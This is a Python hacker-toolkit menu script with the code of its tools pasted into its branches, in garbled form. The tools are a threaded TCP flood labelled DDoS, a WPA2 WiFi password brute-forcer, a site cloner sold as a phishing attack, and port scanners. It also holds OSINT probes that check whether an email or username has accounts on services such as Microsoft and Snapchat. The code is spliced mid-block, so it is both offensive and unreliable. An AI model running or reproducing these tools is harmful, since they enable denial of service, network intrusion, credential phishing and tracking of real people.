import os

import sys

import time

import subprocess

from theme import set_theme, get_current_theme, themes

from pystyle import Colors, Colorate, Write



def animated_text(text, delay=0.05):

    for line in text.split('\n'):

        for char in line:

            sys.stdout.write(char)

            sys.stdout.flush()

            time.sleep(delay)

        sys.stdout.write('\n')

        sys.stdout.flush()

        time.sleep(delay)



def display_ascii_art():

    current_theme = get_current_theme()

    art = f"""{current_theme["primary"]}
    ██ ▄█▀▓█████  ██▓     ██▓      ██████          ▄▄▄█████▓ ▒█████   ▒█████   ██▓    
 ██▄█▒ ▓█   ▀ ▓██▒    ▓██▒    ▒██    ▒          ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    
▓███▄░ ▒███   ▒██░    ▒██░    ░ ▓██▄            ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    
▓██ █▄ ▒▓█  ▄ ▒██░    ▒██░      ▒   ██▒         ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    
▒██▒ █▄░▒████▒░██████▒░██████▒▒██████▒▒           ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒
▒ ▒▒ ▓▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░▒ ▒▓▒ ▒ ░           ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░
░ ░▒ ▒░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░░ ░▒  ░ ░             ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░
░ ░░ ░    ░     ░ ░     ░ ░   ░  ░  ░             ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   
░  ░      ░  ░    ░  ░    ░  ░      ░                        ░ ░      ░ ░      ░  ░
 
 Developers : KellS
 ───────────────────── 
 
[1]-> Sql Vulenerability
[2]-> Web Scanner
[3]-> Brute Wifi 
[4]-> Phishing Attack
[5]-> DDoS IP
[6]-> Ip Tracer
[7]-> Email-Osint
[8]-> Osint Phone Number
[9]-> Username Osint
[10]-> Ip Generator

{current_theme["reset"]}"""

    animated_text(art, delay=0.00)
def execute_script(script_name):
    script_path = os.path.join('utils', f'{script_name}')
    try:
        subprocess.run(['python', script_path], check=True)
    except subprocess.CalledProcessError as e:
        print(f"{get_current_theme()['primary']}Error executing script '{script_name}': {e}{get_current_theme()['reset']}")

def main():
    install_packages(REQUIRED_PACKAGES)
    os.system('cls' if os.name == 'nt' else 'clear')

    current_theme = get_current_theme()

    warning_message = f"""
{current_theme["primary"]}
      ____               
     /___/\_     WARNING: The use of these tools can have significant
    _\   \/_/\__  risks and consequences. By using this software, you
  __\       \/_/\  agree that we are not responsible for any damage or
  \   __    __ \ \  issues that may arise from the use of these tools.
 __\  \_\   \_\ \ \   __ Please use responsibly and at your own risk.
/_/\\   __   __  \ \_/_/\          
\_\/_\__\/\__\/\__\/_\_\/             
   \_\/_/\       /_\_\/
      \_\/       \_\/
{current_theme["reset"]}
    """

    animated_text(warning_message, delay=0.01)

    input("\nPress Enter to continue...")

    os.system('cls' if os.name == 'nt' else 'clear')

    display_ascii_art()

    username = os.getlogin()
    while True:
        current_theme = get_current_theme()
        prompt = f"""
{current_theme["primary"]}╭─── {current_theme["secondary"]}KellS@user/tools{current_theme["reset"]}
{current_theme["primary"]}│
{current_theme["primary"]}╰─$ {current_theme["reset"]} """
        
        choice = input(prompt).strip()
        if choice == '1':
from Config.Util import *
from Config.Config import *
try:
    import threading
    import time
    import socket
except Exception as e:
   ErrorModule(e)
   
Title("Ip Pinger")

try:
    hostname = input(f"\n{BEFORE + current_time_hour() + AFTER} {INPUT} Ip -> " + color.RESET)
    try:
        port_input = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Port (enter for default) -> " + color.RESET)
        if port_input.strip():
            port = int(port_input)
        else:
            port = 80  
        
        bytes_input = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Bytes (enter for default) -> " + color.RESET)
        if bytes_input.strip():
            bytes = int(bytes_input)
        else:
            bytes = 64

        threads_input = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Threads (enter for default) -> {color.RESET}")
        if threads_input.strip():
            threads_number = threads_input
        else:
            threads_number = 1
    except:
        ErrorNumber()

    def ping_ip():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            start_time = time.time() 
            sock.connect((hostname, port))
            data = b'\x00' * bytes
            sock.sendall(data)
            end_time = time.time() 
            elapsed_time = (end_time - start_time) * 1000 
            print(f'{BEFORE + current_time_hour() + AFTER} {ADD} Ping to {white}{hostname}{red}: time={white}{elapsed_time:.2f}ms{red} port={white}{port}{red} bytes={white}{bytes}{red} status={white}succeed{red}')
        except:
            elapsed_time = 0
            print(f'{BEFORE + current_time_hour() + AFTER} {ERROR} Ping to {white}{hostname}{red}: time={white}{elapsed_time}ms{red} port={white}{port}{red} bytes={white}{bytes}{red} status={white}fail{red}')

    def request():
        threads = []
        try:
            for _ in range(int(threads_number)):
                t = threading.Thread(target=ping_ip)
                t.start()
                threads.append(t)
        except:
            ()

        for thread in threads:
            thread.join()

    while True:
        request()
except Exception as e:
    Error(e)
      
            execute_script('SQL Vulnerabitility.py')

        elif choice == '2':
from Config.Util import *
from Config.Config import *
try:
    import socket
    import requests
except Exception as e:
    ErrorModule(e)

Title("Website Info Scanner")

try:
    def domain_scan(website_url):
        domain = website_url.replace("https://", "").replace("http://", "").split('/')[0]
        return domain
    
    def secure_scan(website_url):
        if website_url.startswith("https://"):
            secure = True
        else:
            secure = False
        return secure

    def status_scan(website_url):
        try:
            response = requests.get(website_url)
            status_code = response.status_code
        except:
            status_code = 404
        return status_code

    def ip_scan(domain):
        try:
            ip = socket.gethostbyname(domain)
        except:
            ip = "None"

        try:
            response = requests.get(f"https://{website}/api/ip/ip={ip}")
            api = response.json()
            status = api['status']
            host_isp = api['isp']
            host_org = api['org']
            host_as = api['as']
        except:
            status = "Invalid"
            host_isp = "None"
            host_org = "None"
            host_as = "None"

        return ip, status, host_isp, host_org, host_as
    
    def port_scan(ip):
        try:
            open_ports = []
            common_ports = {
                80: "HTTP",
                443: "HTTPS",
                21: "FTP",
                22: "SSH",
                25: "SMTP",
                53: "DNS",
                110: "POP3",
                143: "IMAP",
                3306: "MySQL",
                5432: "PostgreSQL",
                6379: "Redis",
                27017: "MongoDB",
                8080: "HTTP-alt"
            }
            
            for port, service in common_ports.items():
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                try:
                    result = sock.connect_ex((ip, port))
                    if result == 0:
                        open_ports.append((port, service))
                except:
                    return None
                finally:
                    sock.close()
            return ' / '.join([f'{port}:{service}' for port, service in open_ports])
        except:
            return None

    Slow(scan_bannner)
    website_url = input(f"\n{BEFORE + current_time_hour() + AFTER} {INPUT} Website Url -> {reset}")
    Censored(website_url)
        
    print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Scanning..{reset}\n")

    if "https://" not in website_url and "http://" not in website_url:
        website_url = "https://" + website_url

    print(f"    {INFO_ADD} Website     : {white}{website_url}{red}")

    domain = domain_scan(website_url)
    print(f"    {INFO_ADD} Domain      : {white}{domain}{red}")

    secure = secure_scan(website_url)
    print(f"    {INFO_ADD} Secure      : {white}{secure}{red}")

    status_code = status_scan(website_url)
    print(f"    {INFO_ADD} Status Code : {white}{status_code}{red}")

    ip, ip_status, host_isp, host_org, host_as = ip_scan(domain)
    print(f"""    {INFO_ADD} Ip          : {white}{ip}{red}
    {INFO_ADD} Ip Status   : {white}{ip_status}{red}
    {INFO_ADD} Host Isp    : {white}{host_isp}{red}
    {INFO_ADD} Host Org    : {white}{host_org}{red}
    {INFO_ADD} Host As     : {white}{host_as}{red}""")

    open_port = port_scan(ip)
    print(f"    {INFO_ADD} Open Port   : {white}{open_port}{reset}")

    print()
    Continue()
    Reset()

except Exception as e:
    Error(e)
            execute_script('Web Scanner.py')

        elif choice == '3':
try:
    import pywifi
except ModuleNotFoundError:
    os.system("pip install pywifi")
from pywifi import const


def welcome_screen():
    """
    Shows the welcome screen
    """
    check_root()

    sprint(f"\n{red}Note: {cyan}This tool is made by Xpert for educational purpose...")
    sprint(f"\n{green}Preparing Attack...")
    time.sleep(2)
    clear()
    banner()


def show_help():
    """
    Show help and exit
    """
    banner()
    print(
        f"\t{red}-> {cyan}Usage: {yellow}python3 bruteWifi.py [wordlist]\n"
        f"\t{red}-> {cyan}python3 bruteWifi.py {yellow}(it wil use default wordlist)"
    )
    exit()


def check_root():
    """
    Checks for admin privileges
    """
    if os.getuid() == 0:
        pass
    else:
        if "aarch64" in platform.machine():
            sys.exit("Run this tool as root in Termux.")
        elif "Linux" in platform.platform():
            sys.exit("You need to be root.")
        elif "Windows" in platform.platform():
            sys.exit(
                "I am developed to work on Windows. Dont worry I'll take care of next!"
            )


def scan(face):
    face.scan()
    return face.scan_results()


def main():
    wifi = pywifi.PyWiFi()
    inface = wifi.interfaces()[0]
    scanner = scan(inface)

    num = len(scanner)

    print(f"{red}Number of wifi found: {random_color}{str(num)}")
    input(f"{yellow}\nPress enter to start___")

    for i, x in enumerate(scanner):
        res = test(num - i, inface, x, passwords, ts)

        if res:
            print(random_color + "=" * 20)
            print(f"{red}Password found : {cyan}{str(res)}\n")

            with open("avail_wifis.txt", "a") as f:
                f.write(str(res) + "\n")

            print(random_color + "=" * 20)


def test(i, face, x, key, ts):
    wifi_name = x.bssid if len(x.ssid) > len(x.bssid) else x.ssid

    if wifi_name in tried:
        print(
            f"{red}[!] {yellow}Password tried -- {str(wifi_name)}\n{green}Password is known!"
        )
        return False

    print(f"{random_color}Trying to connect to wifi {str(wifi_name)}")

    for n, password in enumerate(key):
        if f"{wifi_name} -- {password}" in found:
            print(f"{red}Password already found +_+")
            continue
else:
with open("tried_passwords.txt", "a") as f:
                f.write(str(wifi_name) + "--" + str(password) + "\n")
        tried.append(str(wifi_name) + "--" + str(password))
        print(
            f"{random_color}Trying password {red}{str(password)} "
            f"{cyan}{str(n)} / {green}{str(len(key))}"
        )

        profile = pywifi.Profile()
        profile.ssid = wifi_name
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        # Remove all hotspot configurations
        face.remove_all_network_profiles()
        tmp_profile = face.add_network_profile(profile)
        face.connect(tmp_profile)
        code = 10
        t1 = time.time()
        # Cyclic refresh status, if set to 0, the password is wrong,
        # if timeout, proceed to the next
        while code != 0:
            time.sleep(0.1)
            code = face.status()
            now = time.time() - t1
            if now > ts:
                break
            if code == 4:
                face.disconnect()
                return str(wifi_name) + "--" + str(password)
    return False


if __name__ == "__main__":
    if len(sys.argv) == 2:
        if sys.argv[1] == "--help":
            show_help()
        passwd_list = sys.argv[1]
    else:
        passwd_list = "passWords.txt"
    welcome_screen()

    passwords = [
        x.strip("\n")
        for x in open(passwd_list, "r", encoding="UTF-8", errors="ignore").readlines()
    ]
    tried = [
        x.strip("\n").split("--")[0] for x in open("avail_wifis.txt", "a+").readlines()
    ]
    found = [x.strip("\n") for x in open("tried_passwords.txt", "a+").readlines()]
    ts = 15

    running = True

    while running:
        main()
        # perform another wifi hack?
        ch = input(f"{random_color}{'Do you want to continue? (y/n): '}").lower()

        if ch == "no" or ch == "n":
            clear()
            exit(0)
        else:
            clear()
            banner()
            execute_script('Brute Wifi.py')

        elif choice == '4':

            execute_script('Phishing Attack.py')
from Config.Config import *

try:
    import os
    import requests
    from bs4 import BeautifulSoup
    import re
    from urllib.parse import urljoin
except Exception as e:
    ErrorModule(e)

Title("Phishing Attack")

try:
    Slow(phishing_banner)
    website_url = input(f"\n{BEFORE + current_time_hour() + AFTER} {INPUT} Website Url -> {reset}")
    Censored(website_url)
    if "https://" not in website_url and "http://" not in website_url:
        website_url = "https://" + website_url

    def css_and_js(html_content, base_url):
        soup = BeautifulSoup(html_content, 'html.parser')

        print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Css recovery..")
        css_links = soup.find_all('link', rel='stylesheet')
        all_css = ""

        for link in css_links:
            css_url = urljoin(base_url, link['href'])
            try:
                css_response = requests.get(css_url)
                if css_response.status_code == 200:
                    all_css += css_response.text + "\n"
                else:
                    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error retrieving css.")
            except:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error retrieving css.")
        
        if all_css:
            style_tag = soup.new_tag('style')
            style_tag.string = all_css
            soup.head.append(style_tag)
            for link in css_links:
                link.decompose()

        print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Javascript recovery..")
        script_links = soup.find_all('script', src=True)
        all_js = ""

        for script in script_links:
            js_url = urljoin(base_url, script['src'])
            try:
                js_response = requests.get(js_url)
                if js_response.status_code == 200:
                    all_js += js_response.text + "\n"
                else:
                    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error retrieving javascript.")
            except:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error retrieving javascript.")
        
        if all_js:
            script_tag = soup.new_tag('script')
            script_tag.string = all_js
            soup.body.append(script_tag)
            for script in script_links:
                script.decompose()

        return soup.prettify()

    print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Html recovery..")
    response = requests.get(website_url, timeout=5)
    if response.status_code == 200:
        html_content = response.text
        soup = BeautifulSoup(html_content, 'html.parser')
        file_name = re.sub(r'[\\/:*?"<>|]', '-', soup.title.string if soup.title else 'page_sans_titre')

        file_html_relative = f'./1-Output/PhishingAttack/{file_name}.html'
        file_html = os.path.abspath(file_html_relative)

        final_html = css_and_js(html_content, website_url)

        with open(file_html, 'w', encoding='utf-8') as file:
            file.write(final_html)
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Phishing attack successful. The file is located in the folder \"{white}{file_html_relative}{red}\"")
        Continue()
        Reset()
    else:
        ErrorUrl()
        elif choice == '5':

            execute_script('DDoS IP.py')
from Config.Util import *
from Config.Config import *
try:
    import threading
    import time
    import socket
except Exception as e:
   ErrorModule(e)
   
Title("Ip Pinger")

try:
    hostname = input(f"\n{BEFORE + current_time_hour() + AFTER} {INPUT} Ip -> " + color.RESET)
    try:
        port_input = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Port (enter for default) -> " + color.RESET)
        if port_input.strip():
            port = int(port_input)
        else:
            port = 80  
        
        bytes_input = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Bytes (enter for default) -> " + color.RESET)
        if bytes_input.strip():
            bytes = int(bytes_input)
        else:
            bytes = 64

        threads_input = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Threads (enter for default) -> {color.RESET}")
        if threads_input.strip():
            threads_number = threads_input
        else:
            threads_number = 1
    except:
        ErrorNumber()

    def ping_ip():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            start_time = time.time() 
            sock.connect((hostname, port))
            data = b'\x00' * bytes
            sock.sendall(data)
            end_time = time.time() 
            elapsed_time = (end_time - start_time) * 1000 
            print(f'{BEFORE + current_time_hour() + AFTER} {ADD} Ping to {white}{hostname}{red}: time={white}{elapsed_time:.2f}ms{red} port={white}{port}{red} bytes={white}{bytes}{red} status={white}succeed{red}')
        except:
            elapsed_time = 0
            print(f'{BEFORE + current_time_hour() + AFTER} {ERROR} Ping to {white}{hostname}{red}: time={white}{elapsed_time}ms{red} port={white}{port}{red} bytes={white}{bytes}{red} status={white}fail{red}')

    def request():
        threads = []
        try:
            for _ in range(int(threads_number)):
                t = threading.Thread(target=ping_ip)
                t.start()
                threads.append(t)
        except:
            ()

        for thread in threads:
            thread.join()

    while True:
        request()
except Exception as e:
    Error(e)
        elif choice == '6':

            execute_script('IP TRACER.py')
from Config.Util import *
from Config.Config import *
try:
    import requests
    import subprocess
    import socket
    import concurrent.futures
except Exception as e:
   ErrorModule(e)
   
Title("Ip Info (Lookup)")

try:


    def ping_ip(ip):
        try:
            if sys.platform.startswith("win"):
                result = subprocess.run(['ping', '-n', '1', ip], capture_output=True, text=True, timeout=1)
            elif sys.platform.startswith("linux"):
                result = subprocess.run(['ping', '-c', '1', '-W', '1', ip], capture_output=True, text=True, timeout=1)
            if result.returncode == 0:
                ping = "Succeed"
            else:
                ping = "Fail"
        except:
            ping = "Fail"

        print(f"    {INFO_ADD} Ping       : {white}{ping}{red}")

    open_ports = []

    def port_ip(ip):
        def scan_port(ip, port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                result = sock.connect_ex((ip, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except:
                pass

        with concurrent.futures.ThreadPoolExecutor() as executor:
            results = {executor.submit(scan_port, ip, port): port for port in range(1, 1000 + 1)}
        concurrent.futures.wait(results)

        print(f"    {INFO_ADD} Open Port  : {white}{open_ports}{red}")

    def dns_ip(ip):
        try:
            dns, aliaslist, ipaddrlist = socket.gethostbyaddr(ip)
        except:
            dns = "None"
        print(f"    {INFO_ADD} DNS        : {white}{dns}{red}")


    def info_ip(ip):
        try:
            response = requests.get(f"https://{website}/api/ip/ip={ip}")
            api = response.json()

            ip = api['ip']
            status = api['status']
            country = api['country']
            country_code = api['country_code']
            region = api['region']
            region_code = api['region_code']
            zip = api['zip']
            city = api['city']
            latitude = api['latitude']
            longitude = api['longitude']
            timezone = api['timezone']
            isp = api['isp']
            org = api['org']
            as_host = api['as']
            loc_url = api['loc_url']
            credit = api['credit']
            copyright = api['copyright']

        except:
            response = requests.get(f"http://ip-api.com/json/{ip}")
            api = response.json()

            try:
                if api['status'] == "success": status = "Valid"
                else: status = "Invalid"
            except: 
                status = "Invalid"

            try: country = api['country']
            except: country = "None"
            try: country_code = api['countryCode']
            except: country_code = "None"
            try: region = api['regionName']
            except: region = "None"
            try: region_code = api['region']
            except: region_code = "None"
            try: zip = api['zip']
            except: zip = "None"
            try: city = api['city']
            except: city = "None"
            try: latitude = api['lat']
            except: latitude = "None"
            try: longitude = api['lon']
            except: longitude = "None"
            try: timezone = api['timezone']
            except: timezone = "None"
            try: isp = api['isp']
            except: isp = "None"
            try: org = api['org']
            except: org = "None"
            try: as_host = api['as']
            except: as_host = "None"
            loc_url = f"https://www.google.com/maps/search/?api=1&query={latitude},{longitude}"

        Slow(f"""    {INFO_ADD} Status     : {white}{status}{red}
    {INFO_ADD} Country    : {white}{country} ({country_code}){red}
    {INFO_ADD} Region     : {white}{region} ({region_code}){red}
    {INFO_ADD} Zip        : {white}{zip}{red}
    {INFO_ADD} City       : {white}{city}{red}
    {INFO_ADD} Latitude   : {white}{latitude}{red}
    {INFO_ADD} Longitude  : {white}{longitude}{red}
    {INFO_ADD} Timezone   : {white}{timezone}{red}
    {INFO_ADD} Isp        : {white}{isp}{red}
    {INFO_ADD} Org        : {white}{org}{red}
    {INFO_ADD} As         : {white}{as_host}{red}{reset}""")
        return loc_url
        

    Slow(map_banner)
    ip = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Ip -> {reset}")
    print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Information Recovery..{reset}")
    print(f"\n    {INFO_ADD} Ip         : {white}{ip}{red}")
    ping_ip(ip)
    dns_ip(ip)
    loc_url = info_ip(ip)
    port_ip(ip)
    print()
    try:
        BrowserPrivate(site=loc_url, title=f"Ip Localisation ({loc_url})", search_bar=False)
    except:
        pass
    Continue()
    Reset()
except Exception as e:
    Error(e)
        elif choice == '7':

            execute_script('Email-osint.py')
            elif "Confirm it's you" in text_translated(text_page()):
                snapchat = "Error: Captcha"
            else:
                snapchat = True
        except Exception as e:
            snapchat = f"Error: {e}"
        return snapchat

    def microsoft_search():
        print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Search in Microsoft..{blue}")
        try:
            driver.get(r"https://login.microsoftonline.com/common/oauth2/v2.0/authorize?scope=service%3A%3Aaccount.microsoft.com%3A%3AMBI_SSL%20openid%20profile%20offline_access&response_type=code&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin-oauth&client-request-id=61ddde4f-db57-4b1a-a700-ba7c7805ba76&x-client-SKU=MSAL.Desktop&x-client-Ver=4.58.1.0&x-client-OS=Windows%20Server%202019%20Datacenter&prompt=select_account&client_info=1&state=H4sIAAAAAAAEAA3NS4JDMAAA0LvMtgu0SC3rU5Voqe_IjqJCKhm_weln3gXel8xul3EBneq48lrUc0c_NdoTd7O6JtZEDbvfyIprH7znfVwMjdqParx-9uQuNRW0w9lihW6eHEA4r00aDk8UnA769wokAScYDogZCZkWEm7tmXGuvUYHY09VR_NH0JFuJHLhQoTGLbCH8PIb1zHUnySbyyxtfDvY1eljrmRhspZZQl-lsExXmBORPSGgWZb5fax4F7rmUuoHcj5Q0CFRbaK2VRBQTtJdukZI1zQuyFv0f7_dH15iwZtQ2QuwOR3E-2bkoEV9UJf-5ATnX-Pqn8clW56WL-0OcZt3_lJpf-ZTqBbo9WDabQtvHIulB6YCBoGcZolLGVo8RawoWpJjK3k4iipSeaFIhmsx2AzndvcazJorRwU68x267ObPX39XKEYaggEAAA&msaoauth2=true&lc=1036&ru=https%3A%2F%2Faccount.microsoft.com%2Faccount%3Flang%3Dfr-fr%26refd%3Dwww.google.com")
            driver.implicitly_wait(10)
            time.sleep(2)
            email_enter = driver.find_element(By.XPATH, '//input[@type="email" and @name="loginfmt" and @id="i0116"]')
            email_enter.send_keys(email)
            email_enter.send_keys(Keys.RETURN)
            time.sleep(2)
            if "This Microsoft account does not exist" in text_translated(text_page()):
                microsoft = False
            elif "Enter a valid email address, phone number, or Skype ID" in text_translated(text_page()):
                microsoft = False
            else:
                microsoft = True
        except Exception as e:
            microsoft = f"Error: {e}"
        return microsoft

    def spotify_search():
        print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Search in Spotify..{blue}")
        try:
            driver.get(r"https://www.spotify.com/fr/signup?flow_id=8f84ffe4-cbe3-481c-99c7-944f17ec3405%3A1715044537&forward_url=https%3A%2F%2Faccounts.spotify.com%2Ffr%2Fstatus")
            driver.implicitly_wait(10)
            time.sleep(2)
            email_enter = driver.find_element(By.XPATH, '//input[@id="username" and @type="email" and @autocomplete="username"]')
            email_enter.send_keys(email)
            email_enter.send_keys(Keys.RETURN)
            time.sleep(1)
            try:
                if "COOKIE" in text_translated(text_page()):
                    driver.execute_script('document.getElementById("onetrust-accept-btn-handler").click();')
            except:
                pass
            time.sleep(1)
            if "This address is already linked to an existing account" in text_translated(text_page()):
                spotify = True
            elif "This email address is invalid" in text_translated(text_page()):
                spotify = False
            else:
                spotify = False
        except Exception as e:
            spotify = f"Error: {e}"
        return spotify

    def pornhub_search():
        print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Search in Pornhub..{blue}")
        try:
            driver.get(r"https://fr.pornhub.com/signup")
            driver.implicitly_wait(10)
            time.sleep(2)
            email_enter = driver.find_element(By.ID, 'createEmail')
            email_enter.send_keys(email)
            email_enter.send_keys(Keys.RETURN)
            time.sleep(2)
            if "Incorrect email format" in text_translated(text_page()):
                pornhub = False 
            elif "Email already taken" in text_translated(text_page()):
                pornhub = True
            else:
                pornhub = False
        except Exception as e:
            pornhub = f"Error: {e}"
        return pornhub

    Slow(f"""
{BEFORE + current_time_hour() + AFTER} {INFO} The email "{white}{email}{red}" was found:

    {INFO_ADD} Spotify   : {white}{spotify_search()}{red}
    {INFO_ADD} Snapchat  : {white}{snapchat_search()}{red}
    {INFO_ADD} Instagram : {white}{instagram_search()}{red}
    {INFO_ADD} Pornhub   : {white}{pornhub_search()}{red}
    {INFO_ADD} Twitter   : {white}{twitter_search()}{red}
    {INFO_ADD} Google    : {white}{google_search()}{red}
    {INFO_ADD} Microsoft : {white}{microsoft_search()}{red}
    """)

    driver.quit()

    Continue()
    Reset()
except Exception as e:
    Error(e
        elif choice == '8':

            execute_script('PHONE NUMBER OSINT.py')
            driver.get(link)
            driver.implicitly_wait(10)
            time.sleep(2)
            if "This content could not be found" in text_translated(text_page()):
                snapchat = False
            else:
                snapchat = link
        except Exception as e:
            snapchat = f"Error: {e}"
        return snapchat

    def linktree_search():
        print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Search in Linktree..{blue}")
        try:
            link = r"https://linktr.ee/" + username
            driver.get(link)
            driver.implicitly_wait(10)
            time.sleep(2)
            if "The page youâ€™re looking for doesnâ€™t exist" in text_translated(text_page()):
                linktree = False
            else:
                linktree = link
        except Exception as e:
            linktree = f"Error: {e}"
        return linktree

    def roblox_search():
        print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Search in Roblox..{blue}")
        try:
            link = r"https://www.roblox.com/search/users?keyword=" + username
            driver.get(link)
            driver.implicitly_wait(10)
            time.sleep(2)
            if "No results available for" in text_translated(text_page()):
                roblox = False
            else:
                roblox = link
        except Exception as e:
            roblox = f"Error: {e}"
        return roblox

    def streamlabs_search():
        print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Search in Streamlabs..{blue}")
        try:
            link = r"https://streamlabs.com/" + username + r"/tip"
            driver.get(link)
            driver.implicitly_wait(10)
            time.sleep(2)
            if "UNAUTHORIZED" in text_translated(text_page()):
                streamlabs = False
            elif "401" in text_translated(text_page()):
                streamlabs = False
            else:
                streamlabs = link
        except Exception as e:
            streamlabs = f"Error: {e}"
        return streamlabs


    Slow(f"""
{BEFORE + current_time_hour() + AFTER} {INFO} The username "{white}{username}{red}" was found:

    {INFO_ADD} Tiktok     : {white}{tiktok_search()}{red}
    {INFO_ADD} Instagram  : {white}{instagram_search()}{red}
    {INFO_ADD} Snapchat   : {white}{snapchat_search()}{red}
    {INFO_ADD} Giters     : {white}{giters_search()}{red}
    {INFO_ADD} Github     : {white}{github_search()}{red}
    {INFO_ADD} Paypal     : {white}{paypal_search()}{red}
    {INFO_ADD} Telegram   : {white}{telegram_search()}{red}
    {INFO_ADD} Linktree   : {white}{linktree_search()}{red}
    {INFO_ADD} Roblox     : {white}{roblox_search()}{red}
    {INFO_ADD} Streamlabs : {white}{streamlabs_search()}{red}
    """)

    driver.quit()

    Continue()
    Reset()
except Exception as e:
    Error(e)
        elif choice == '9':

            execute_script('Username Osint.py')
from Config.Util import *
from Config.Config import *
try:
    import requests
    import json
    import random
    import threading

except Exception as e:
   ErrorModule(e)
   
Title("Ip Generator")

try:
    webhook = input(f"\n{BEFORE + current_time_hour() + AFTER} {INPUT} Webhook ? (y/n) -> {reset}")
    if webhook in ['y', 'Y', 'Yes', 'yes', 'YES']:
        webhook_url = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Webhook URL -> {reset}")
        CheckWebhook(webhook_url)

    try:
        threads_number = int(input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Threads Number -> {reset}"))
    except:
        ErrorNumber()

    def send_webhook(embed_content):
        payload = {
        'embeds': [embed_content],
        'username': username_webhook,
        'avatar_url': avatar_webhook
        }

        headers = {
        'Content-Type': 'application/json'
        }

        requests.post(webhook_url, data=json.dumps(payload), headers=headers)

    number_valid = 0
    number_invalid = 0
    def ip_check():
        global number_valid, number_invalid
        number_1 = random.randint(1, 255)
        number_2 = random.randint(1, 255)
        number_3 = random.randint(1, 255)
        number_4 = random.randint(1, 255)
        ip = f"{number_1}.{number_2}.{number_3}.{number_4}"

        try:
            if sys.platform.startswith("win"):
                result = subprocess.run(['ping', '-n', '1', ip], capture_output=True, text=True, timeout=0.1)
            elif sys.platform.startswith("linux"):
                result = subprocess.run(['ping', '-c', '1', '-W', '1', ip], capture_output=True, text=True, timeout=0.1)

            if result.returncode == 0:
                number_valid += 1
                if webhook in ['y']:

                    embed_content = {
                    'title': f'Ip Valid !',
                    'description': f"**__Ip:__**\n```{ip}```",
                    'color': color_webhook,
                    'footer': {
                    "text": username_webhook,
                    "icon_url": avatar_webhook,
                    }
                    }
                    send_webhook(embed_content)
                    print(f"{green}[{white}{current_time_hour()}{green}] {GEN_VALID} Logs: {color.WHITE}{number_invalid} invalid - {number_valid} valid{color.RED} | Status:  {color.WHITE}Valid{color.GREEN}  | Ip: {color.WHITE}{ip}{color.GREEN}")
                else:
                    print(f"{green}[{white}{current_time_hour()}{green}] {GEN_VALID} Logs: {color.WHITE}{number_invalid} invalid - {number_valid} valid{color.RED} | Status:  {color.WHITE}Valid{color.GREEN}  | Ip: {color.WHITE}{ip}{color.GREEN}")
                
            else:
                number_invalid += 1
                print(f"{red}[{white}{current_time_hour()}{red}] {GEN_INVALID} Logs: {color.WHITE}{number_invalid} invalid - {number_valid} valid{color.RED} | Status: {color.WHITE}Invalid{color.RED} | Ip: {color.WHITE}{ip}{color.RED}")
        except:
            number_invalid += 1
            print(f"{red}[{white}{current_time_hour()}{red}] {GEN_INVALID} Logs: {color.WHITE}{number_invalid} invalid - {number_valid} valid{color.RED} | Status: {color.WHITE}Invalid{color.RED} | Ip: {color.WHITE}{ip}{color.RED}")
        Title(f"Ip Generator - Invalid: {number_invalid} - Valid: {number_valid}")

    def request():
        threads = []
        try:
            for _ in range(int(threads_number)):
                t = threading.Thread(target=ip_check)
                t.start()
                threads.append(t)
        except:
            ErrorNumber()

        for thread in threads:
            thread.join()

    while True:
        request()
except Exception as e:
    Error(e)
        elif choice == '10':

            execute_script('IP generator.py')
            print("\nAvailable themes:")

            for i, theme_name in enumerate(themes.keys(), 1):

                print(f"{i}. {theme_name}")

            theme_choice = input("Choose a theme by number: ").strip()

            theme_names = list(themes.keys())

            try:

                theme_index = int(theme_choice) - 1

                if 0 <= theme_index < len(theme_names):

                    set_theme(theme_names[theme_index])

                    os.system('cls' if os.name == 'nt' else 'clear')

                    display_ascii_art() 

                else:

